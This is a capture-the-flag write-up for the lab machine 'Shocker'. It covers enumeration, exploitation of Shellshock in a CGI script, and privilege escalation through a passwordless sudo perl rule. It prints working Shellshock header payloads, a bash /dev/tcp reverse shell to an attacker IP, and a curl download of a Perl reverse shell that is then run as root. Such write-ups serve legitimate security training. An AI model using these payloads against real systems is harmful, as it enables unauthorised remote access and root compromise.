Box: Linux
Level: Easy

### Index
1.  [Box Info](#Box%20Info)
2.  [Nmap Enum](#Nmap%20Enum)
3. [Web enumeration](#Web%20enumeration)
	1. [`Almost Got The Shell...`](#`Almost%20Got%20The%20Shell...`)
	2. [`Validating Shell Shock using nmap`](#`Validating%20Shell%20Shock%20using%20nmap`)
	3. [`ShellShock using CURL`](#`ShellShock%20using%20CURL`)
	4. [`User Flag using ShellShock`](#`User%20Flag%20using%20ShellShock`)
4. [Privilege Escalation](#Privilege%20Escalation)
	1. [`Grab the Perl Shell`](#`Grab%20the%20Perl%20Shell`)
	2. [`Got Root Flag`](#`Got%20Root%20Flag`)

### Box Info
```
Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.
```

### Nmap Enum
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn shocker.htb
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```
Only two open ports.  

### Web enumeration
```
# feroxbuster -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x sh
200      GET        7l       18w      119c http://shocker.htb/cgi-bin/user.sh
```

Browsing `http://shocker.htb` and `http://shocker.htb/cgi-bin/user.sh` would show us the following 
![](shocker_port80.png)

We will spin up Burp Suite to capture the HTTP request and response pair.

###### `Almost Got The Shell...`
![](shocker_ShellShock.png)
I started the NetCat Listener on port 4444 and trying to inject the ShellShock payload through the `User-Agent` HTTP Request Header however, the shell dropped right away.

###### `Validating Shell Shock using nmap`
```
# nmap -p80 --min-rate=1000 --script "http-shellshock" --script-args "uri=/cgi-bin/user.sh,cmd=ls" shocker.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 23:11 EDT
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at shocker.htb Port 80</address>
|   </body></html>
```

You can perform the RCE using HTTP User Agent Request header and nmap using the following command. In my case, it was not echoing back the output in the HTTP response.
```
# nmap -p80 --min-rate=1000 --script "http-shellshock" --script-args "uri=/cgi-bin/user.sh,cmd='echo User-Agent: () { :; }; echo; /bin/whoami'" shocker.htb
```

###### `ShellShock using CURL`
```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: shocker.htb' -H $'Accept-Language: en-US' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: () { :; }; echo; echo; /bin/bash -c \'cat /etc/passwd\'' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    $'http://shocker.htb/cgi-bin/user.sh'
```

###### `User Flag using ShellShock`
```
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker.htb
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.8/4444 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

On the NetCat Listener Side,
```
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
0ccf63e4f368*********************
```
Get your User Flag

### Privilege Escalation

Uploaded `LinEnum.sh` and than running it throws the `Permission Denied`. Change the permission using `chmod +x LinEnum.sh` command. Following to that `LinEnum` run.
```
[-] Kernel information (continued):
Linux version 4.4.0-96-generic (buildd@lgw01-10) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017

[+] We can sudo without supplying a password!
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
[+] Possible sudo pwnage!
/usr/bin/perl

[-] Root is allowed to login via SSH:
PermitRootLogin yes

[-] Sudo version:
Sudo version 1.8.16
```

Looks like we are allowed to execute `Perl` command with sudo. I will simply grab the Perl Shell from the GitHub and get it on the target and execute.

###### `Grab the Perl Shell`
Grab the Perl Shell from [Here](https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl) and get it on the box. make sure to change the IP and Port.

```
shelly@Shocker:/tmp$ curl -o perl-reverse-shell.pl http://10.10.14.8/perl-reverse-shell.pl
<o perl-reverse-shell.pl http://10.10.14.8/perl-reverse-shell.pl             
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3713  100  3713    0     0  42872      0 --:--:-- --:--:-- --:--:-- 43682

shelly@Shocker:/tmp$ sudo perl perl-reverse-shell.pl

Content-Length: 0
Connection: close
Content-Type: text/html

shelly@Shocker:/tmp$ Content-Length: 41
Connection: close
Content-Type: text/html

Sent reverse shell to 10.10.14.8:5555<p>
```

###### `Got Root Flag`
On the NetCat Listener side
```
# nc -lvnp 5555           
listening on [any] 5555 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.56] 36822
 00:02:58 up  2:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd  
/
# cd root
# ls
root.txt
# cat root.txt
b4d7e8e22b046fd33bac60590020a747
# 

```

Grab the root flag.